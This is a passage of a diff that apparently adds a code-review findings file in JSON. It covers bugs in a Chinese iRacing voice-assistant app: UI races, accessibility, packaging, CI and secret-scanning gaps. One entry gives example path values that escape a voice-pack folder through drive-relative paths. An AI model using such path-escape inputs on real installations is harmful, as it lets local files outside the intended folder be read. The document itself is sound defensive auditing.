+      "detail": "spmsg内\\outside.wav与C:outside.wav都不是is_absolute且无..，被允许；与E:/pack拼接却指E盘根或其他驱动器相对位置。可读/播放进程有权访问的包外WAV或找错文件；输入来自本地自定义语音包，不是远程提权/RCE。未读取真实包外文件。"
+    },
+    {
+      "id": "R12",
+      "group": "R",
+      "priority": "P3",
+      "title": "winsound多片段播放忽略间隔与首包回调",
+      "refs": [
+        "voice-assistant/src/player.py:138-160",
+        "voice-assistant/src/engine.py:763-769"
+      ],
+      "evidence": "callback缺失mock复现；间隔为静态",
+      "detail": "fallback直接sum(play)，不执行gap_ms或on_start。成功播放仍first_audio_ms=None，拼接节奏与主后端不同。真实音频未播放；不把winsound原有不能选输出设备的已知能力限制再算bug。"
+    },
+    {
+      "id": "R13",
+      "group": "R",
+      "priority": "P3",
+      "title": "CLI成功早退或初始化失败未关闭Assistant",
+      "refs": [
+        "voice-assistant/src/voice_app.py:74-127",
+        "voice-assistant/src/engine.py:98-99"
+      ],
+      "evidence": "FakeAssistant两条早退路径复现",
+      "detail": "--wav成功return0、麦克风预检失败return2均未close；ASR载入/warmup异常也在最后finally之外。采样/SDK/播放器未正常清理，复用main时仍存活；进程真正退出后OS可回收，未夸大成永久跨进程泄漏。"
+    },
+    {
+      "id": "R14",
+      "group": "R",
+      "priority": "P3",
+      "title": "CLI自检忽略配置麦克风，且绕过原生格式回退",
+      "refs": [
+        "voice-assistant/src/voice_app.py:45-64",
+        "voice-assistant/src/listener.py:50-63"
+      ],
+      "evidence": "设备参数mock复现＋格式路径静态",
+      "detail": "配置已选chosen但--selftest没传--device时，probe和sd.rec都用None默认麦。录音还固定16k/mono，不沿用探测到的原生率；48k-only设备可能正式PTT可用、自检反而失败。硬件格式失败尚未实机试。"
+    },
+    {
+      "id": "R15",
+      "group": "R",
+      "priority": "P3",
+      "title": "托盘启动超时后线程继续，晚到对象失去统一清理",
+      "refs": [
+        "voice-assistant/app/desktop.py:1165-1172",
+        "voice-assistant/app/desktop.py:1200-1208",
+        "voice-assistant/app/desktop.py:1429-1441",
+        "voice-assistant/app/desktop.py:1597-1600"
+      ],
+      "evidence": "假.NET线程超时复现＋主入口管理静态",
+      "detail": "start等待超时False但线程继续；放行后running变True。ensure_tray只保存成功返回对象，下一次可另建托盘，finally只管holder中的对象。真实8秒慢启动、多图标未观察；进程退出最终可回收，属条件生命周期问题。"
+    },
+    {
+      "id": "F01",
+      "group": "F",
+      "priority": "P2",
+      "title": "主面板监听按钮请求不存在的API，必返404",
+      "refs": [
+        "voice-assistant/app/static/app.js:1363",
+        "voice-assistant/app/server.py:1102-1105",
+        "voice-assistant/tools/test_ui.cjs:43"
+      ],
+      "evidence": "Lead真实隔离HTTP404＋Edge探针",
+      "detail": "主面板发/api/ptt/start或/stop，后端仅有/api/listen。语音输入页可绕行，所以定P2而非P1。既有UI回归把不存在的start/stop人为mock成成功，因而16组回归全绿仍漏此错。"
+    },
+    {
+      "id": "F02",
+      "group": "F",
+      "priority": "P1",
+      "title": "执行旧请求晚回会复活已失效的改车按钮，重复执行旧操作",
+      "refs": [
+        "voice-assistant/app/static/app.js:417-421",
+        "voice-assistant/app/static/app.js:448"
+      ],
+      "evidence": "新鲜Edge＋全POST mock复现",
+      "detail": "预览old operation→执行延迟→输入改new question，编辑时虽禁用了按钮，旧回包仍无代号核对地renderTrace并重新启用。再点时第二次play仍发送old operation，输入却显示new question。可重复旧加油/换胎设置；本轮只记录mock POST，未真实改车。"
+    },
+    {
+      "id": "F03",
+      "group": "F",
+      "priority": "P2",
+      "title": "切全局AI档位会删除尚未保存的模型和密钥草稿",
+      "refs": [
+        "voice-assistant/app/static/app.js:543-546",
+        "voice-assistant/app/static/app.js:1004-1008"
+      ],
+      "evidence": "新鲜Edge内存API复现",
+      "detail": "填新模型/Key后切全局AI开关，实际只保存mode，却删除整组模型draft并重绘：模型退回saved-model、Key变空。没有离开页面或明确放弃操作也丢草稿。"
+    },
+    {
+      "id": "F04",
+      "group": "F",
+      "priority": "P2",
+      "title": "保存请求发出后的新编辑会被旧响应覆盖",
+      "refs": [
+        "voice-assistant/app/static/app.js:544-546",
+        "voice-assistant/app/static/app.js:1065-1067"
+      ],
+      "evidence": "新鲜Edge延迟保存复现",
+      "detail": "保存first-model时再输入newer-model，旧保存成功后无草稿版本比较地删除draft/loadSettings，回到first-model。输入未禁用且新修改无提示丢失；其他分区同类写法静态存在，未逐个浏览器复测。"
+    },
+    {
+      "id": "F05",
+      "group": "F",
+      "priority": "P2",
+      "title": "选择服务预设后，派生地址与模型草稿跨导航丢失",
+      "refs": [
+        "voice-assistant/app/static/app.js:1019-1026",
+        "voice-assistant/app/static/app.js:1351",
+        "voice-assistant/app/static/app.js:538"
+      ],
+      "evidence": "新鲜Edge导航复现",
+      "detail": "选DeepSeek时直接改input.value，未触发input登记草稿。离开回来，预设仍DeepSeek，但地址/模型退回旧saved.invalid/saved-model。再次保存可形成新服务商标签＋旧目的地址，影响用户判断Key实际发往何处。"
+    },
+    {
+      "id": "F06",
+      "group": "F",
+      "priority": "P2",
+      "title": "旧模型列表响应可污染已切换的服务商下拉",
+      "refs": [
+        "voice-assistant/app/static/app.js:1024-1033",
+        "voice-assistant/app/static/app.js:1044-1054"
+      ],
+      "evidence": "新鲜Edge延迟响应复现",
+      "detail": "旧接口拉列表等待时切DeepSeek，虽已清cache，老响应回来仍写全局cache并展示旧模型。没有generation或请求地址核对。当前地址已新、建议列表仍旧，可能保存不兼容模型；跨保存相同竞态为静态补充。"
+    },
+    {
+      "id": "F07",
+      "group": "F",
+      "priority": "P2",
+      "title": "Overlay宽高表单允许范围与后端相互冲突",
+      "refs": [
+        "voice-assistant/app/static/app.js:823",
+        "voice-assistant/app/static/app.js:884-885",
+        "voice-assistant/src/config.py:387-392"
+      ],
+      "evidence": "前后端确定性契约比对",
+      "detail": "UI宣称且夹紧到240–4096×80–2160，后端只收480–1200×140–400。按界面合法输入240×80或宽1300也返回400。不是屏幕分辨率差异，未真正保存实际配置。"
+    },
+    {
+      "id": "F08",
+      "group": "F",
+      "priority": "P2",
+      "title": "旧voice覆盖界面保存的新speaker音色",
+      "refs": [
+        "voice-assistant/app/static/app.js:808",
+        "voice-assistant/app/static/app.js:984-991",
+        "voice-assistant/src/tts_engine.py:160-165"
+      ],
+      "evidence": "前后端闭环＋AI组交叉核对",
+      "detail": "旧配置voice=shimmer，UI显示speaker优先并只保存speaker；改nova后实际TTS仍voice优先发送shimmer。表单与执行的优先级相反，切服务商也可带入旧不兼容音色。未调用外部TTS。"
+    },
+    {
+      "id": "F09",
+      "group": "F",
+      "priority": "P2",
+      "title": "实际播放失败仍展示预览成功，不显示失败原因",
+      "refs": [
+        "voice-assistant/app/static/app.js:370-375",
+        "voice-assistant/app/static/app.js:408-413",
+        "voice-assistant/app/server.py:625-630"
+      ],
+      "evidence": "新鲜Edge失败回包复现",
+      "detail": "非改车问答playback.ok=false/reason明确失败，UI只按decision和plan显示可以回答及预览成功，没有全局错误。用户听不到声音又看不到后端已给的失败原因。"
+    },
+    {
+      "id": "F10",
+      "group": "F",
+      "priority": "P2",
+      "title": "知识库选择节点或格子后键盘焦点落到BODY",
+      "refs": [
+        "voice-assistant/app/static/app.js:1463",
+        "voice-assistant/app/static/app.js:1616",
+        "voice-assistant/app/static/app.js:1769-1779"
+      ],
+      "evidence": "新鲜Edge图谱和矩阵Enter复现",
+      "detail": "激活有焦点的节点后innerHTML重建整树，未恢复焦点。详情虽更新，activeElement变BODY，后续Tab需重走导航和工具条，打断连续键盘探索。两视图同一根因，合并计数。"
+    },
+    {
+      "id": "F11",
+      "group": "F",
+      "priority": "P2",
+      "title": "矩阵数量小字对比度低于AA要求",
+      "refs": [
+        "voice-assistant/app/static/app.js:1592-1610",
+        "voice-assistant/app/static/app.css:3",
+        "voice-assistant/app/static/app.css:68"
+      ],
+      "evidence": "源码颜色数学测量",
+      "detail": "10.5px文字#f6f6f7配#3f7cbe/#5b95dc/#6ba8ed，对比度分别4.02、2.87、2.30:1，低于普通小字4.5:1；最大计数格必用最浅一色。这是可测可访问性问题，不是主观颜色偏好。"
+    },
+    {
+      "id": "F12",
+      "group": "F",
+      "priority": "P2",
+      "title": "小窗口图谱无溢出却把字号压到约5像素",
+      "refs": [
+        "voice-assistant/app/static/app.css:42-46",
+        "voice-assistant/app/static/app.js:1487"
+      ],
+      "evidence": "新鲜Edge几何测量",
+      "detail": "固定672宽viewBox配width100%；390窗口中SVG宽311、CTM约0.46278，名义11.5px实际5.32px。无最小画布或图内缩放，信息几乎不可读；矩阵是绕行方式。没有用不溢出测试通过冒充可读。"
+    },
+    {
+      "id": "F13",
+      "group": "F",
+      "priority": "P2",
+      "title": "日志／统计接口错误被伪装成空数据或无提示旧数据",
+      "refs": [
+        "voice-assistant/app/static/app.js:260-267",
+        "voice-assistant/app/static/app.js:461"
+      ],
+      "evidence": "新鲜Edge 503复现＋旧值路径静态",
+      "detail": "日志失败清成空数组，显示还没有记录、最近0条；统计失败直接return，空白或保留旧值却无失败提示。用户将服务故障误认成没有发生问答；两处同类错误隐匿合并一项。"
+    },
+    {
+      "id": "F14",
+      "group": "F",
+      "priority": "P2",
+      "title": "总线把实际全部交给AI显示为白名单",
+      "refs": [
+        "voice-assistant/app/static/app.js:141-146"
+      ],
+      "evidence": "静态确定",
+      "detail": "renderBus只处理full/analysis_key，漏mode=all；AI已启用且配置完整的all档在运行态显示白名单。赛前检查对实际联网接管范围给出错误提示，与设置页冲突。"
+    },
+    {
+      "id": "F15",
+      "group": "F",
+      "priority": "P2",
+      "title": "语音输入页开关成功后按钮仍显示相反动作",
+      "refs": [
+        "voice-assistant/app/static/app.js:527",
+        "voice-assistant/app/static/app.js:663-666"
+      ],
+      "evidence": "新鲜Edge状态轮询复现",
+      "detail": "listen响应后立即loadSettings优先使用旧window.__state；后续poll只改状态不重绘按钮。后端及__state都已running=true，按钮仍启动监听；停止方向也反向。用户难以判断当前监听状态及下一次点击含义。"
+    },
+    {
+      "id": "F16",
+      "group": "F",
+      "priority": "P2",
+      "title": "合法按设备名配置时，UI误显示系统默认",
+      "refs": [
+        "voice-assistant/app/static/app.js:591-598",
+        "voice-assistant/app/static/app.js:621-622",
+        "voice-assistant/app/static/app.js:1231-1233",
+        "voice-assistant/src/config.py:347-350"
+      ],
+      "evidence": "新鲜Edge名称设备fixture复现",
+      "detail": "后端支持设备名字符串，deviceOptions只与index比较。配置Named headphones且列表有同名设备时，UI选value空的系统默认，实际配置仍用指定名称；输入和输出均走该函数，误导音频路由诊断。"
+    },
+    {
+      "id": "F17",
+      "group": "F",
+      "priority": "P2",
+      "title": "整数输入无效值悄悄变默认，显示与保存不一致",
+      "refs": [
+        "voice-assistant/app/static/app.js:614-615",
+        "voice-assistant/app/static/app.js:634-642"
+      ],
+      "evidence": "新鲜Edge失焦保存复现",
+      "detail": "文本框仅inputmode=numeric；abc/空串/0经parseInt||默认变线程4，1.5变1，PTT阈值亦回默认250。输入abc失焦后仍显示abc，实际POST保存4且不报非法。不是后端校验失效，而是前端在发出前改变了值。"
+    },
+    {
+      "id": "F18",
+      "group": "F",
+      "priority": "P3",
+      "title": "时间格式舍入没有向分钟进位",
+      "refs": [
+        "voice-assistant/app/static/app.js:153-156"
+      ],
+      "evidence": "直接运行提取原函数",
+      "detail": "先floor分钟后独立toFixed秒；59.5显示0:60，59.999显示0:60.00，119.999显示1:60.00。分钟边界上一圈/剩余时间可出现非法秒数。"
+    },
+    {
+      "id": "F19",
+      "group": "F",
+      "priority": "P3",
+      "title": "统计刷新持续增加ResizeObserver而不释放",
+      "refs": [
+        "voice-assistant/app/static/charts.js:332",
+        "voice-assistant/app/static/charts.js:615",
+        "voice-assistant/app/static/app.js:484"
+      ],
+      "evidence": "新鲜Edge代理原生观察者计数",
+      "detail": "首次统计1个，再刷新两次为3个，watch无去重/disconnect。长会话累积旧数据闭包及重复resize绘图；不只是一次性小对象开销。"
+    },
+    {
+      "id": "F20",
+      "group": "F",
+      "priority": "P3",
+      "title": "知识库选项卡声明与键盘契约不完整",
+      "refs": [
+        "voice-assistant/app/static/index.html:16",
+        "voice-assistant/app/static/app.js:1813-1816"
+      ],
+      "evidence": "静态可访问性契约",
+      "detail": "role=tablist/tab却没有aria-controls/对应tabpanel、方向键导航及roving tabindex，两个tab都进入Tab序列。屏幕阅读器用户按通常选项卡箭头操作无反应；Tab+Enter和鼠标仍可绕行，未做屏幕阅读器真机测试。"
+    },
+    {
+      "id": "Q01",
+      "group": "Q",
+      "priority": "P2",
+      "title": "当前全历史密钥扫描被固定测试假Key阻断",
+      "refs": [
+        "scripts/secret_scan.py:102-116",
+        "voice-assistant/tests/test_ai_models.py:13",
+        ".github/workflows/secret-scan.yml:46-47",
+        ".gitleaks.toml:17-30"
+      ],
+      "evidence": "Lead实际扫描exit1",
+      "detail": "608个文本blob中仅命中固定测试fixture，不是真实凭据泄漏。强规则未对该占位值精确豁免，CI每push/PR运行故该检查必失败；gitleaks同形规则也匹配但本轮未运行gitleaks。不要用宽泛放行sk-test掩盖真正Key。"
+    },
+    {
+      "id": "Q02",
+      "group": "Q",
+      "priority": "P2",
+      "title": "中文／特殊暂存路径可能被密钥扫描静默漏掉",
+      "refs": [
+        "scripts/secret_scan.py:148-158"
+      ],
+      "evidence": "Git路径编码与扫描代码闭环",
+      "detail": "git diff --name-only未-z，按splitlines后直接git show :path。默认quotePath把中文等C风格转义，得到的不是原路径；show失败却continue并可exit0。本地pre-commit可漏扫，CI全历史走不同路径，不将其混为同一路径失效。"
+    },
+    {
+      "id": "Q03",
+      "group": "Q",
+      "priority": "P3",
+      "title": "唯一CI工作流没有功能、界面、链接或构建回归",
+      "refs": [
+        ".github/workflows/secret-scan.yml:15-47"
+      ],
+      "evidence": "受控文件完整工作流清单",
+      "detail": "只有gitleaks及项目密钥扫描；后端、UI、links、打包窗口smoke均未作为CI门禁。属于工程保障缺口，不是声称现有pytest失败；错误路由、删除模块后的CLI等可在CI无功能回归时合入。"
+    },
+    {
+      "id": "Q04",
+      "group": "Q",
+      "priority": "P3",
+      "title": "试播诊断工具连--help都因已删模块崩溃",
+      "refs": [
+        "voice-assistant/tools/play_test.py:17",
+        "voice-assistant/tools/play_test.py:50-52",
+        "voice-assistant/src/player.py:57-58"
+      ],
+      "evidence": "Lead实际--help退出1",
+      "detail": "仍import已删除src.duck，ModuleNotFoundError发生在参数解析前；即便去掉导入，仍向Player传已删除ducker参数。音量压低功能删除后工具没有同步，未进行任何真实音频播放。"
+    },
+    {
+      "id": "Q05",
+      "group": "Q",
+      "priority": "P3",
+      "title": "文档推荐的短语自检在Windows默认GBK下崩溃",
+      "refs": [
+        "voice-assistant/tools/check_library.py:31-39",
+        "voice-assistant/tools/check_library.py:88",
+        "DEVELOPMENT.md:35-38"
+      ],
+      "evidence": "Lead实际UnicodeEncodeError",
+      "detail": "main未统一控制台编码，打印↔在本机GBK抛错，后半自检及链式命令无法完成。显式UTF8可绕行但文档正常调用未设置；不是短语本身的匹配失败。"
+    },
+    {
+      "id": "Q06",
+      "group": "Q",
+      "priority": "P2",
+      "title": "窗口冒烟白屏／超时仍返回成功",
+      "refs": [
+        "voice-assistant/app/desktop.py:1474-1478",
+        "voice-assistant/app/desktop.py:1586-1609"
+      ],
+      "evidence": "发布组与运行组独立源码交叉",
+      "detail": "20秒未loaded只设quit_requested；只有loaded写成功记录，退出仅overlay模式检查结果，window模式仍return0，还不清旧成功文件。发行验证可把页面未加载判成功。未构建或启动真实打包窗口，报告的是配方路径确定的假绿。"
+    },
+    {
+      "id": "Q07",
+      "group": "Q",
+      "priority": "P2",
+      "title": "修改文案后合成／打包仍复用旧录音",
+      "refs": [
+        "scripts/synthesize_telemetry.py:29-30",
+        "scripts/synthesize_telemetry.py:54-57",
+        "scripts/build_pack.py:308-311"
+      ],
+      "evidence": "静态缓存键与重建链闭环",
+      "detail": "缓存仅按msgId/序号，不含文本、音色、参数；synthesize工具没有完整force链，build_pack已有WAV不重制。改文案再重跑可新索引文字配旧声音，甚至删MP3重合成仍保留旧WAV。"
+    },
+    {
+      "id": "Q08",
+      "group": "Q",
+      "priority": "P2",
+      "title": "缺文案或音频仍可生成空／静音语音包并成功退出",
+      "refs": [
+        "scripts/content_loader.py:31-33",
+        "scripts/build_pack.py:303-305",
+        "scripts/build_pack.py:314-322",
+        "scripts/build_pack.py:368-371"
+      ],
+      "evidence": "静态默认输入与退出码闭环",
+      "detail": "不存在的输入路径被静默滤掉，空items仍写索引；缺MP3只警告return0，有总msgId表时缺录音还补NULL。干净源码默认messages模式没有对应主文案，错路径也会成功。没有把用户明确指定的静音NULL本身算缺陷。"
+    },
+    {
+      "id": "Q09",
+      "group": "Q",
+      "priority": "P2",
+      "title": "豆包单句--text命令不可达，可能误走批量任务",
+      "refs": [
+        "scripts/tts_doubao.py:123-125",
+        "scripts/tts_doubao.py:154-187"
+      ],
+      "evidence": "argparse默认值与分支静态闭环",
+      "detail": "--content默认非空，if args.content永远优先于elif args.text；正常--text被忽略。无主文案时零任务成功，有主文案时可能误批量请求计费。未使用真实凭据/实际调用。"
+    },
+    {
+      "id": "Q10",
+      "group": "Q",
+      "priority": "P2",
+      "title": "TTS转WAV失败仍报成功，下次还跳过补齐",
+      "refs": [
+        "scripts/tts_doubao.py:194",
+        "scripts/tts_doubao.py:215-228"
+      ],
+      "evidence": "静态输出完整性闭环",
+      "detail": "任务是否完成只看MP3；转WAV错误不计failures，留下MP3无WAV也exit0，下次因MP3存在直接跳过。缺ffmpeg或转换异常时声称成功但成品不完整。"
+    },
+    {
+      "id": "Q11",
+      "group": "Q",
+      "priority": "P2",
+      "title": "音频质检漏文件及修复失败都可能假绿",
+      "refs": [
+        "voice-assistant/tools/qc_audio.py:39-51",
+        "voice-assistant/tools/qc_audio.py:99-106"
+      ],
+      "evidence": "静态确定",
+      "detail": "清单音频不存在直接continue，却仍称检查N条；--fix合成失败只打印，复检仅fixed，全部修复失败时again空也return0。缺文件与修复失败未进入最终失败集合；未执行会收费/改音频的修复。"
+    },
+    {
+      "id": "Q12",
+      "group": "Q",
+      "priority": "P2",
+      "title": "离线音频审计未落实文档要求的16k／16bit",
+      "refs": [
+        "voice-assistant/tools/audit_offline.py:35-46",
+        "voice-assistant/tools/audit_offline.py:89",
+        "DEVELOPMENT.md:95"
+      ],
+      "evidence": "Lead实际3210条24k素材仍exit0＋源码",
+      "detail": "审计仅统计采样率，允许8bit，退出码不约束16k/16bit，与开发指南要求不符。本地3210条24k全过证明验证器未检查该契约；这不能推断已发布安装包也含24k音频。"
+    },
+    {
+      "id": "Q13",
+      "group": "Q",
+      "priority": "P2",
+      "title": "文档允许的安装目录自定义短语会被升级覆盖或卸载删除",
+      "refs": [
+        "docs/guide/user-guide.md:318-324",
+        "voice-assistant/packaging/installer.iss:52-54"
+      ],
+      "evidence": "用户说明与Inno配方闭环；未实装",
+      "detail": "指南让用户改安装目录短语库，安装器全树ignoreversion且没有该文件备份/仅首次安装/用户覆盖层。标准覆盖升级会替换自定义问法，卸载也将其作为程序文件删掉；用户数据保留承诺不能覆盖这份安装资源内的自定义内容。"
+    },
+    {
+      "id": "Q14",
+      "group": "Q",
+      "priority": "P2",
+      "title": "Spotter更新说明称无需重装，但安装器不会同步游戏目录",
+      "refs": [
+        "docs/guide/user-guide.md:303-309",
+        "docs/releases/v1.6.0.md:46-47",
+        "voice-assistant/packaging/installer.iss:52-54"
+      ],
+      "evidence": "说明与安装目标闭环；未实装",
+      "detail": "用户先前把语音复制进iRacing/sound/spcc，更新说明却说覆盖助手即可、无需手动重装。安装器只写{app}，不会同步该游戏目录，所以独立Spotter继续读旧包；需要区分助手资源升级与游戏内复制包升级。"
+    },
+    {
+      "id": "Q15",
+      "group": "Q",
+      "priority": "P3",
+      "title": "生成的随包说明仍提已删音量压低与旧退出方式",
+      "refs": [
+        "voice-assistant/packaging/build_dist.py:58",
+        "voice-assistant/packaging/build_dist.py:70",
+        "docs/guide/user-guide.md:48",
+        "docs/guide/user-guide.md:135"
+      ],
+      "evidence": "静态版本契约比对",
+      "detail": "模板仍写右上×退出、音频路由可压低游戏音量；v1.6关窗有托盘/退出选择，duck已删。源码用户指南更新不能自动修正由旧模板生成的使用说明。"
+    },
+    {
+      "id": "Q16",
+      "group": "Q",
+      "priority": "P3",
+      "title": "链接自检固定清单漏了当前版本及核心开发文档",
+      "refs": [
+        "scripts/check_readme_links.py:8-22"
+      ],
+      "evidence": "静态完整清单核对",
+      "detail": "仅列到v1.5.5，不含当前v1.6.0、DEVELOPMENT、CONTRIBUTING、SECURITY等；README链接到某文档只核目标存在，不递归检查其出链。141链接PASS不是全仓库链接都已检查。"
+    },
+    {
+      "id": "Q17",
+      "group": "Q",
+      "priority": "P3",
+      "title": "干净克隆的方向盘自检最后写报告时缺父目录",
+      "refs": [
+        "voice-assistant/tools/wheel_selftest.py:39"
+      ],
+      "evidence": "静态干净克隆路径核对",
+      "detail": "audit目录不受控且代码没有mkdir，自检完成前半虚拟设备验证后仍因写结果FileNotFoundError失败。现场若恰有旧audit目录可掩盖；本轮未实际操作方向盘。"
+    },
+    {
+      "id": "Q18",
+      "group": "Q",
+      "priority": "P3",
+      "title": "麦克风纯探测--probe仍强制要求无用WAV参数",
+      "refs": [
+        "voice-assistant/tools/mic_loop_test.py:30",
+        "voice-assistant/tools/mic_loop_test.py:35-54"
+      ],
+      "evidence": "argparse及分支静态确定",
+      "detail": "probe分支根本不读wav，但位置参数必填，因此自然的--probe命令在参数解析退出，必须填无意义路径。正常非probe需要WAV的约束不受本项质疑。"
+    },
+    {
+      "id": "Q19",
+      "group": "Q",
+      "priority": "P3",
+      "title": "ASR噪声基准使用随机化hash，跨运行不复现",
+      "refs": [
+        "voice-assistant/tools/bench_asr.py:109"
+      ],
+      "evidence": "静态种子生成确定",
+      "detail": "seed取Python hash(file)，未固定PYTHONHASHSEED时进程间不同。同一素材与参数的版本对比混入不同噪声，准确率变化不全来自代码。应记录稳定种子；本轮未重新跑ASR基准。"
+    },
+    {
+      "id": "Q20",
+      "group": "Q",
+      "priority": "P2",
+      "title": "测试音频生成部分失败仍成功并缩小验证样本",
+      "refs": [
+        "voice-assistant/tools/make_test_audio.py:130-147"
+      ],
+      "evidence": "静态失败路径确定",
+      "detail": "失败任务只收集，未进入新manifest；只要有任一成功结果就exit0。额度不足/局部服务错误会让测试集变小而流水线绿，后续准确率可能显得更好。未调用收费生成接口。"
+    },
+    {
+      "id": "Q21",
+      "group": "Q",
+      "priority": "P3",
+      "title": "pyirsdk完整MIT notice未见于明确构建收集路径",
+      "refs": [
+        "voice-assistant/packaging/xiaoxiao.spec:21-40",
+        "voice-assistant/packaging/build_dist.py:173-176",
+        "THIRD_PARTY_NOTICES.md:5"
+      ],
+      "evidence": "配方风险＋本地依赖许可证核对；待产物验证",
+      "detail": "pyirsdk1.3.7的MIT要求附版权和许可全文，代码文件自身不含；spec仅导入irsdk，collect_all名单不含该分发元数据，项目notice只列名称，未见独立复制许可证。尚未解包实际安装包，不把配方缺口扩大成对已发布成品的侵权结论；需产物清单核实。"
+    },
+    {
+      "id": "Q22",
+      "group": "Q",
+      "priority": "P3",
+      "title": "模型与音频来源没有精确版本及许可追溯清单",
+      "refs": [
+        "THIRD_PARTY_NOTICES.md:6-9",
+        "ASSETS-LICENSE.md:15-22",
+        "scripts/import_runtime_assets.py:13-18",
+        "voice-assistant/packaging/build_dist.py:152-159"
+      ],
+      "evidence": "资产治理缺口，不是侵权结论",
+      "detail": "仅写SenseVoice家族/豆包音色名，导入与打包只看文件存在，无精确上游repo/revision、摘要和适用许可记录。相同软件版本可带不同来源模型/声音而notice不变。未访问账号合同，音频再分发权及具体模型条款实际适用状态未知。"
+    },
+    {
+      "id": "Q23",
+      "group": "Q",
+      "priority": "P2",
+      "title": "构建直接复制工作配置，缺少凭据及危险开关发布闸门",
+      "refs": [
+        "voice-assistant/packaging/build_dist.py:37-48",
+        "voice-assistant/packaging/build_dist.py:169"
+      ],
+      "evidence": "Lead合成配置独立复现；未构建",
+      "detail": "make_config只重写四个路径，合成Key与ai.enabled/car_control.enabled=True均原样进入发行配置。维护者临时改基础配置后发版即可意外带出凭据或启用改车；文档告诫不能替代构建校验。没有发现当前发行物中有真实Key。"
+    }
+  ]
+}
